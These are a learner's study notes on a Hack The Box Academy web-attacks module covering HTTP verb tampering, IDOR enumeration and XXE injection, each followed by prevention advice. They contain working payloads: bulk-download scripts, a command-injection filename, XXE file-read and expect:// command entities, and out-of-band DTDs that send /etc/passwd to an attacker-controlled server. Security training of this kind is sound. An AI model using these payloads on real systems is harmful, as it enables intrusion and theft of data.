# Web Attacks

**Platform:** Hack The Box Academy  
**Module:** Web Attacks  
**Sections:** 18  
**Difficulty:** Medium  
**Category:** Offensive Security / Web Application Penetration Testing  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Table of Contents

1. [Overview](#overview)
2. [HTTP Verb Tampering](#http-verb-tampering)
   - [HTTP Verbs Reference](#http-verbs-reference)
   - [Insecure Configurations](#insecure-configurations)
   - [Insecure Coding](#insecure-coding)
   - [Bypassing Basic Authentication](#bypassing-basic-authentication)
   - [Bypassing Security Filters](#bypassing-security-filters)
   - [Verb Tampering Prevention](#verb-tampering-prevention)
3. [Insecure Direct Object References (IDOR)](#insecure-direct-object-references-idor)
   - [IDOR Identification](#idor-identification)
   - [Mass IDOR Enumeration](#mass-idor-enumeration)
   - [Bypassing Encoded References](#bypassing-encoded-references)
   - [IDOR in Insecure APIs](#idor-in-insecure-apis)
   - [Chaining IDOR Vulnerabilities](#chaining-idor-vulnerabilities)
   - [IDOR Prevention](#idor-prevention)
4. [XML External Entity (XXE) Injection](#xml-external-entity-xxe-injection)
   - [XML and DTD Fundamentals](#xml-and-dtd-fundamentals)
   - [Local File Disclosure via XXE](#local-file-disclosure-via-xxe)
   - [Reading Source Code with PHP Filters](#reading-source-code-with-php-filters)
   - [Remote Code Execution via XXE](#remote-code-execution-via-xxe)
   - [Blind XXE — Error-Based Exfiltration](#blind-xxe--error-based-exfiltration)
   - [Blind XXE — Out-of-Band Data Exfiltration](#blind-xxe--out-of-band-data-exfiltration)
   - [Automated XXE with XXEinjector](#automated-xxe-with-xxeinjector)
   - [XXE Prevention](#xxe-prevention)
5. [Key Tools Reference](#key-tools-reference)
6. [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Overview

This module covers three distinct web attack categories that can be found across almost any web application — HTTP Verb Tampering, Insecure Direct Object References (IDOR), and XML External Entity (XXE) Injection. Each attack exploits a different layer of the application stack: server configuration, access control logic, and XML parsing libraries respectively.

### Attack Surface Summary

| Attack | Root Cause | Impact |
|--------|-----------|--------|
| **HTTP Verb Tampering** | Insecure server configuration or insecure coding | Authentication bypass, security filter bypass |
| **IDOR** | Missing or broken back-end access control | Unauthorized data access, privilege escalation, account takeover |
| **XXE Injection** | Outdated XML libraries, unsafe XML parsing configuration | Local file disclosure, SSRF, RCE, server credential theft |

---

## HTTP Verb Tampering

### HTTP Verbs Reference

HTTP defines 9 methods (verbs) that web servers may accept. Developers typically focus on GET and POST, but accepting additional verbs without proper controls creates attack opportunities.

| Verb | Description | Attack Relevance |
|------|-------------|------------------|
| `GET` | Retrieve a resource | Standard — most commonly tested |
| `POST` | Submit data to a resource | Standard — most commonly tested |
| `HEAD` | Identical to GET but returns headers only — no body | Bypasses auth configs that only restrict GET/POST |
| `PUT` | Write payload to specified location | Direct file write if unrestricted |
| `DELETE` | Delete a resource | Destructive — removes files/records if unrestricted |
| `OPTIONS` | Return accepted methods for a resource | Reconnaissance — reveals allowed verbs |
| `PATCH` | Apply partial modifications to a resource | Modifies records without replacing them |

```bash
# Enumerate allowed HTTP methods on any endpoint
Hackerpatel007_1@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/

HTTP/1.1 200 OK
Allow: POST,OPTIONS,HEAD,GET
```

---

### Insecure Configurations

The first type of Verb Tampering vulnerability occurs when web server authentication is only applied to specific HTTP methods — leaving others completely unprotected.

**Vulnerable Apache configuration (000-default.conf or .htaccess):**

```xml
<!-- VULNERABLE — only restricts GET and POST -->
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET POST>
        Require valid-user
    </Limit>
</Directory>
```

An attacker can send a `HEAD` request to `/admin/reset.php` — it passes through unprotected and executes the admin function without any authentication challenge.

**Secure Apache configuration (covers ALL methods):**

```xml
<!-- SECURE — uses LimitExcept to restrict everything except OPTIONS -->
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <LimitExcept OPTIONS>
        Require valid-user
    </LimitExcept>
</Directory>
```

| Framework | Vulnerable Pattern | Secure Pattern |
|-----------|-------------------|----------------|
| Apache | `<Limit GET POST>` | `<LimitExcept OPTIONS>` |
| Tomcat | `<http-method>GET</http-method>` in `web.xml` | Remove `<http-method>` restrictions — default denies all |
| ASP.NET | `verbs="GET,POST"` in `web.config` | Use `verbs="*"` or remove verb restrictions |

---

### Insecure Coding

The second — and more common — type occurs when security filters in application code are only applied to one HTTP method while the underlying function accepts all methods.

**Vulnerable PHP code:**

```php
$pattern = "/^[A-Za-z\s]+$/";

// Filter only checks GET parameter — blocks injection characters
if (preg_match($pattern, $_GET["code"])) {
    // But the query uses $_REQUEST — accepts both GET AND POST
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...
}
```

**Attack:** Send the malicious payload in the **POST** body. The GET parameter is empty — passes the filter. The `$_REQUEST["code"]` picks up the POST value — executes the injection.

**Secure fix — apply the filter to $_REQUEST, not just $_GET:**

```php
if (preg_match($pattern, $_REQUEST["code"])) {
    $query = "... " . $_REQUEST["code"];
}
```

---

### Bypassing Basic Authentication

**Scenario:** The `/admin` directory requires HTTP Basic Auth. Clicking "Reset" triggers a GET request to `/admin/reset.php`, which prompts for credentials.

**Step 1 — Confirm OPTIONS is allowed:**

```bash
Hackerpatel007_1@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/

Allow: POST,OPTIONS,HEAD,GET
```

**Step 2 — Intercept in Burp → Change Request Method to HEAD:**

The server configuration restricts `GET` and `POST` but leaves `HEAD` unprotected. Send a `HEAD` request to `/admin/reset.php`:

```http
HEAD /admin/reset.php HTTP/1.1
Host: SERVER_IP:PORT
```

The server executes the reset function — no login prompt, no `401 Unauthorized`. The page returns no body (as expected with HEAD) but the function runs. All files are deleted — admin action achieved without credentials.

> **Key concept:** `HEAD` is functionally identical to `GET` on the server side — the same handler runs. Only the response body is suppressed. If the auth config uses `<Limit GET POST>`, `HEAD` bypasses it entirely.

---

### Bypassing Security Filters

**Scenario:** A File Manager blocks filenames containing special characters like `;` (command injection characters), returning `Malicious Request Denied!`.

**Step 1 — Confirm the filter applies only to POST:**

Intercept the file creation request. It uses GET. Change the method to POST in Burp:

```
Original: GET /index.php?filename=test%3B
Changed:  POST /index.php (filename=test; in body)
```

The `Malicious Request Denied!` message disappears — the POST parameter bypasses the filter.

**Step 2 — Exploit command injection through the tampered verb:**

```
Filename: file1; touch file2;
Method: POST (bypasses filter)
```

Both `file1` and `file2` are created on the server — confirming that HTTP Verb Tampering bypassed the injection protection and enabled command injection.

---

### Verb Tampering Prevention

**Server Configuration:**

```xml
<!-- Apache — WRONG: leaves HEAD, PUT, DELETE unprotected -->
<Limit GET POST>
    Require valid-user
</Limit>

<!-- Apache — CORRECT: restricts everything except OPTIONS -->
<LimitExcept OPTIONS>
    Require valid-user
</LimitExcept>
```

**Secure Coding — apply security filters consistently:**

```php
// WRONG — filter only covers GET; $_REQUEST picks up POST injection
if (preg_match($pattern, $_GET['code'])) {
    $query = "... " . $_REQUEST['code'];
}

// CORRECT — filter covers all methods
if (preg_match($pattern, $_REQUEST['code'])) {
    $query = "... " . $_REQUEST['code'];
}

// BEST — use specific parameters and disable unused methods entirely
if (preg_match($pattern, $_POST['code'])) {
    $query = "... " . $_POST['code'];
}
```

---

## Insecure Direct Object References (IDOR)

IDOR is one of the most common web vulnerabilities. It occurs when a web application uses user-controlled references (IDs, filenames, hashes) to access back-end objects without verifying that the requesting user has permission to access that specific object.

### IDOR Identification

**Indicators of potential IDOR:**
- Sequential numeric IDs in URL parameters (`?uid=1`, `?id=45`)
- Filenames containing user IDs or dates (`Invoice_1_09_2021.pdf`)
- API endpoints with object identifiers (`/api.php/profile/1`)
- GET or POST parameters that reference database records

**Static File IDOR:**

```
/documents/Invoice_1_09_2021.pdf  — UID 1, September 2021
/documents/Invoice_2_08_2020.pdf  — UID 2, August 2020
```

Change `?uid=1` to `?uid=2` in the URL:

```bash
Hackerpatel007_1@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=2" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

Different files returned — access control is entirely absent on the back end.

---

### Mass IDOR Enumeration

Once an IDOR is confirmed, automate enumeration using bash scripts:

**Script 1 — Download all employee documents (1–10):**

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q $url/$link
    done
done
```

```bash
Hackerpatel007_1@htb[/htb]$ bash ./exploit.sh
Hackerpatel007_1@htb[/htb]$ ls -1

Invoice_1_09_2021.pdf
Invoice_2_08_2020.pdf
Report_1_10_2021.pdf
Report_2_12_2020.pdf
...
```

**Identifying document link pattern via grep:**

```bash
# Grab document links using regex — match everything between /documents and .pdf
Hackerpatel007_1@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

---

### Bypassing Encoded References

Some applications hash object references to obscure them. This appears secure but can be reversed if the hash is computed client-side using a discoverable pattern.

**Intercepted POST request:**

```
POST /download.php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

The value looks like an MD5 hash. Inspect the JavaScript source to find the hash function:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

**Algorithm:** `MD5(base64(uid))`

**Verify by replicating for uid=1:**

```bash
Hackerpatel007_1@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

Hash matches — the algorithm is confirmed. Now generate hashes for all users:

```bash
Hackerpatel007_1@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
...
```

**Script — Download all contracts by computed hash:**

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

```bash
Hackerpatel007_1@htb[/htb]$ bash ./exploit.sh && ls -1

contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
...
```

> **Key insight:** Client-side hashing provides zero security. Move all hash generation to the server side, and never expose the hashing algorithm or input format to the client.

---

### IDOR in Insecure APIs

IDOR vulnerabilities also exist in API calls — not just file references. Exploiting them enables modifying other users' data, escalating privileges, or creating/deleting accounts.

**Intercepted API request (Edit Profile → Update):**

```http
PUT /profile/api.php/profile/1 HTTP/1.1
```

```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat..."
}
```

The `role` field is included in the client-controlled request body — and also reflected in the session cookie `Cookie: role=employee`. This immediately signals the access control is client-side.

**Privilege escalation attempts:**

| Attempt | Result | Reason |
|---------|--------|--------|
| Change `uid` to another user's | `uid mismatch` | Back-end compares uid to API path |
| Change API path to `/profile/2` | `uuid mismatch` | Back-end checks uuid against session |
| POST to create new user | `Creating new employees is for admins only` | Role check from cookie |
| Set `role` to `admin` | `Invalid role` | Role name validation |

All attempts fail independently — but combined with an IDOR information disclosure, the attack succeeds.

---

### Chaining IDOR Vulnerabilities

**Step 1 — Exploit GET IDOR on the API:**

```bash
Hackerpatel007_1@htb[/htb]$ curl -s "http://SERVER_IP:PORT/profile/api.php/profile/2" \
  -H "Cookie: role=employee"
```

```json
{
    "uid": "2",
    "uuid": "4a00f9e4-6f9b-11ec-90d6-0242ac120003",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb"
}
```

The `uuid` of uid=2 is now known.

**Step 2 — Enumerate all users to find admin:**

```bash
Hackerpatel007_1@htb[/htb]$ for uid in {1..20}; do
    curl -s "http://SERVER_IP:PORT/profile/api.php/profile/$uid" | jq .
done
```

Admin user found:

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

**Step 3 — Use discovered `role` name to escalate own privileges:**

```http
PUT /profile/api.php/profile/1

{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "..."
}
```

Response is `200 OK` with no error — the back-end has no server-side role validation. Our account is now `web_admin`.

**Step 4 — Create new users as web_admin:**

```http
POST /profile/api.php/profile/100
Cookie: role=web_admin
```

No error — new user created. Full privilege escalation achieved by chaining an IDOR information disclosure with an insecure function call.

---

### IDOR Prevention

| Layer | Control | Implementation |
|-------|---------|----------------|
| **Access Control** | Role-Based Access Control (RBAC) | Map every API endpoint to a required role — enforce on the back-end, never trust client-supplied roles |
| **Object References** | UUIDs / salted hashes | Replace sequential IDs with UUID v4 or salted hashes — unpredictable, hard to enumerate |
| **Session Mapping** | Server-side role lookup | Derive user roles from session token via back-end RBAC lookup — never from cookie or request body |
| **API Design** | Resource ownership check | For every request, verify: `requesting_user.uid == resource.owner_uid OR requesting_user.role == 'admin'` |

```javascript
// Secure RBAC rule — server-side check
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

---

## XML External Entity (XXE) Injection

### XML and DTD Fundamentals

**XML structure:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <sender>john@inlanefreight.com</sender>
  <body>Hello, please share the invoice.</body>
</email>
```

| Component | Definition | Example |
|-----------|-----------|----------|
| Tag | Key of an XML document | `<date>` |
| Entity | XML variable — replaced on parse | `&lt;` (for `<`) |
| Element | Tag + value between start/end tags | `<date>01-01-2022</date>` |
| Attribute | Specification stored inside a tag | `version="1.0"` |
| Declaration | First line defining version and encoding | `<?xml version="1.0"?>` |

**XML DTD — Document Type Definition:**

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT date (#PCDATA)>
]>
```

**Custom XML Entities (Variables):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<email><body>This is &company;</body></email>
<!-- Renders as: This is Inlane Freight -->
```

**External XML Entities — the XXE root cause:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!-- References a file on the back-end server -->
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
<email><body>&signature;</body></email>
```

When the XML parser processes `&signature;`, it reads the file from the server's filesystem and substitutes its contents — exposing local files to the attacker.

---

### Local File Disclosure via XXE

**Identification:** Fill a contact form that sends XML data. Intercept in Burp — look for `Content-Type: text/xml` or `application/xml` in the POST request.

**Step 1 — Confirm XXE is possible with a custom entity:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<email>
  <name>test</name>
  <email>&company;</email>
</email>
```

If the response displays `Inlane Freight` instead of `&company;`, the parser processes entities — XXE is possible.

**Step 2 — Read a local file:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<email>
  <name>test</name>
  <email>&company;</email>
</email>
```

The response returns the contents of `/etc/passwd` — local file disclosure confirmed.

> **Note:** To confirm which XML element is reflected in the output, test with a simple string entity first. Only reflected elements can carry exfiltrated data in non-blind XXE.

---

### Reading Source Code with PHP Filters

Binary files and PHP source code contain characters that break XML parsing. Use PHP's `php://filter` wrapper to base64-encode the file before it is returned — making it XML-safe:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<email>
  <name>test</name>
  <email>&company;</email>
</email>
```

The response contains a base64-encoded string. Decode it in Burp's Inspector tab or terminal:

```bash
Hackerpatel007_1@htb[/htb]$ echo 'PD9waHAgJGZsYWcgPSAiSFRCe...' | base64 -d

<?php $flag = "HTB{...}"; ?>
```

> **Only works with PHP.** For other server-side languages, use CDATA-based source exfiltration instead.

---

### Remote Code Execution via XXE

If the web application uses outdated PHP with the `expect://` wrapper enabled, RCE is possible directly via XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://id">
]>
<email>
  <name>test</name>
  <email>&company;</email>
</email>
```

If `expect://` is available, the `id` command executes and the output is returned. This is rare — most modern PHP installations disable `expect://` by default.

---

### Blind XXE — Error-Based Exfiltration

When the application does not reflect XML entity values in its output but does display PHP runtime errors, an error-based technique extracts file contents via deliberately crafted error messages.

**Host a malicious external DTD (`xxe.dtd`):**

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

This DTD defines a `file` entity containing `/etc/hosts`, then creates an `error` entity that references a non-existing entity alongside the file content. When parsed, the error message reveals the file contents.

**Serve the DTD and send the trigger payload:**

```bash
Hackerpatel007_1@htb[/htb]$ vi xxe.dtd
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.16.36:8000/xxe.dtd">
  %remote;
  %error;
]>
```

The server's PHP error response includes the file contents embedded in the error string.

---

### Blind XXE — Out-of-Band Data Exfiltration

For completely blind XXE (no output, no errors), use Out-of-Band (OOB) exfiltration — the server sends the file contents to the attacker via an HTTP request.

**Step 1 — Write the malicious DTD (`xxe.dtd`):**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.16.36:8000/?content=%file;'>">
```

**Step 2 — Write the PHP decoder (`index.php`):**

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

**Step 3 — Start the PHP server:**

```bash
Hackerpatel007_1@htb[/htb]$ php -S 0.0.0.0:8000
```

**Step 4 — Send the OOB trigger payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.16.36:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

**Step 5 — Receive and decode:**

```
PHP 7.4.3 Development Server started
10.10.14.16:46256 [200]: /xxe.dtd
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

The entire `/etc/passwd` file is returned via the PHP server log — completely blind on the target's side.

---

### Automated XXE with XXEinjector

```bash
# Clone the tool
Hackerpatel007_1@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git

# Prepare request file — include the first XML line + XXEINJECT marker
# (copy raw request from Burp, add XXEINJECT where the entity should go)
```

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Type: text/plain;charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

```bash
# Run automated OOB exfiltration with PHP filter + HTTP OOB channel
Hackerpatel007_1@htb[/htb]$ ruby XXEinjector.rb \
  --host=10.10.16.36 --httpport=8000 \
  --file=/tmp/xxe.req \
  --path=/etc/passwd \
  --oob=http --phpfilter

# Results saved to the tool's Logs directory
Hackerpatel007_1@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log

root:x:0:0:root:/root:/bin/bash
...
```

---

### XXE Prevention

| Control | Implementation |
|---------|----------------|
| **Update XML libraries** | Replace deprecated `libxml_disable_entity_loader()` in PHP; update to PHP 8.0+ |
| **Disable external DTDs** | Set `LIBXML_NOENT` flag to disable entity substitution |
| **Disable external entities** | Configure XML parser to block `SYSTEM` and `PUBLIC` external references |
| **Disable parameter entities** | Block `%entity;` usage in DTD definitions |
| **Disable XInclude** | Prevent `xi:include` from loading external documents |
| **Prevent entity loops** | Set maximum entity expansion depth to prevent billion-laugh attacks |
| **Use safe formats** | Replace XML/SOAP APIs with JSON/REST where possible |
| **Error handling** | Suppress PHP runtime errors in production — prevents error-based XXE |
| **WAF** | Deploy ModSecurity or cloud WAF as defence-in-depth — not a primary control |

---

## Key Tools Reference

| Command | Purpose |
|---------|----------|
| `curl -i -X OPTIONS http://TARGET/` | Enumerate accepted HTTP methods |
| `curl -i -X HEAD http://TARGET/admin/reset.php` | Test HEAD method auth bypass |
| `curl -s "http://TARGET/documents.php?uid=2" \| grep -oP "\/documents.*?.pdf"` | Extract document links from IDOR-vulnerable page |
| `echo -n 1 \| base64 -w 0 \| md5sum` | Replicate client-side MD5(base64(uid)) hash for IDOR bypass |
| `for i in {1..10}; do echo -n $i \| base64 -w 0 \| md5sum \| tr -d ' -'; done` | Generate hash list for mass IDOR enumeration |
| `curl -sOJ -X POST -d "contract=$hash" http://TARGET/download.php` | Download file via POST IDOR with computed hash |
| `for uid in {1..100}; do curl -s "http://TARGET/api.php/user/$uid"; echo; done` | Mass enumerate API users for IDOR |
| `<!ENTITY company SYSTEM "file:///etc/passwd">` | Basic XXE local file read entity |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | PHP filter XXE for source code exfiltration |
| `echo 'base64string' \| base64 -d` | Decode XXE base64 exfiltrated file content |
| `python3 -m http.server 8000` | Serve malicious DTD file for blind/OOB XXE |
| `php -S 0.0.0.0:8000` | Start PHP server to receive and decode OOB XXE data |
| `ruby XXEinjector.rb --host=IP --httpport=8000 --file=req --path=/etc/passwd --oob=http --phpfilter` | Automated OOB XXE exfiltration with XXEinjector |
| `git clone https://github.com/enjoiz/XXEinjector.git` | Clone XXEinjector tool |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1190 | — | Exploit Public-Facing Application — HTTP Verb Tampering, IDOR, and XXE against web apps |
| T1548 | T1548.002 | Abuse Elevation Control Mechanism — HTTP Verb Tampering bypassing Basic Auth on restricted endpoints |
| T1078 | T1078.003 | Valid Accounts: Local Accounts — IDOR privilege escalation setting role to `web_admin` |
| T1083 | — | File and Directory Discovery — XXE reading `/etc/passwd`, web config files, source code |
| T1552 | T1552.001 | Unsecured Credentials: Credentials in Files — XXE reading config files containing passwords |
| T1005 | — | Data from Local System — IDOR mass enumeration downloading all employee documents and contracts |
| T1213 | — | Data from Information Repositories — IDOR API enumeration leaking user UUIDs and role names |
| T1059 | T1059.004 | Command and Scripting Interpreter: Unix Shell — command injection via HTTP Verb Tampering filter bypass |
| T1071 | T1071.001 | Application Layer Protocol: Web Protocols — OOB XXE exfiltration via HTTP GET to attacker server |
| T1041 | — | Exfiltration Over C2 Channel — OOB XXE sending base64-encoded file contents to PHP listener |

---

*Module completed as part of the HTB Academy CPTS path.*  
*Penetration Tester role in India | Target: January 2027*
